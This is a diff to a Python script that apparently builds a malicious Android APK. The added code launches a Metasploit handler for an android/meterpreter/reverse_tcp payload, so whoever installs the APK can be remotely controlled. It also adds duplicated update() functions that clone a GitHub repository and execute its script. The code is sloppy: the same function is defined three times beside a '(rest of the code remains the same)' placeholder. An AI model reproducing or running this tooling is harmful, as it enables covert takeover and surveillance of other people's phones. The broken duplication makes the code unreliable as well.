@@ -16,6 +16,40 @@ def build_payload():
 
     os.system(f"mv {apk_name}.apk /storage/emulated/0/")
 
+    control_apk = input("Do you want to control your Payload Now? (Y/N) ").strip()
+    if control_apk.lower() == 'y':
+        
+        metasploit_commands = [
+            'msfconsole',
+            'use exploit/multi/handler',
+            f'set payload android/meterpreter/reverse_tcp',
+            f'set LHOST {lhost}',
+            f'set LPORT {lport}',
+            'exploit'
+        ]
+        os.system(';'.join(metasploit_commands))
+    elif control_apk.lower() == 'n':
+        return 
+    else:
+        print("Invalid input. Please enter 'Y' or 'N'.")
+
+def update():
+    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
+    os.chdir("Metainsbul")
+    os.system("chmod +x Meta.py")
+    os.system("python Meta.py")
+
+
+def update():
+    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
+    os.chdir("Metainsbul")
+    os.system("chmod +x Meta.py")
+    os.system("python Meta.py")
+
+# ... (rest of the code remains the same)
+
+    
+    
 def update():
     os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
     os.chdir("Metainsbul")
